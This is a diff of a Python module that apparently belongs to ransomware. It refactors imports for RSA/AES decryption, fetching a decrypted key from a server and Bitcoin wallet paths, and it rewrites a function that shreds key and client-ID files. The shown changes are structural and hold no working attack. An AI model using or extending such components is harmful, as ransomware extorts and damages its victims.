@@ -1,23 +1,22 @@
 import os
 import logging
 import requests
-import utils
+import core.utils as utils
 from base64 import b64decode, b64encode
-from symmetric_encryption import AES
-from asymmetric_encryption import RSA
-from comms import get_decrypted_key_from_server
-from config import (
+from core.crypto.symmetric_encryption import AES
+from core.crypto.asymmetric_encryption import RSA
+from core.comms.decrypt import get_decrypted_key_from_server
+from core.config import (
     ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
     UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
     ENCRYPTED_AES_KEY_FILE_LOCATION,
     UNENCRYPTED_AES_KEY_FILE_LOCATION,
     ENCRYPTED_BITCOIN_KEY_LOCATION,
     BITCOIN_WALLET_ID_PATH,
+    CLIENT_ID_LOCATION
 )
 
-
 logger = logging.getLogger(__name__)
-
 
 def decrypt_local_rsa_key():
     logger.info("Decrypting local RSA key")
@@ -66,10 +65,9 @@ def decrypt_file(aes_key, initialization_vector, encrypted_file_path):
 
 
 def delete_key_files():
-    utils.shred_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
-    utils.shred_file(UNENCRYPTED_AES_KEY_FILE_LOCATION)
-    utils.shred_file(ENCRYPTED_BITCOIN_KEY_LOCATION)
-    utils.shred_file(BITCOIN_WALLET_ID_PATH)
+    list_of_important_files = [UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,UNENCRYPTED_AES_KEY_FILE_LOCATION,ENCRYPTED_BITCOIN_KEY_LOCATION, BITCOIN_WALLET_ID_PATH, CLIENT_ID_LOCATION]
+    for file in list_of_important_files:
+        utils.shred_file(file)
 
 
 def decrypt_files():
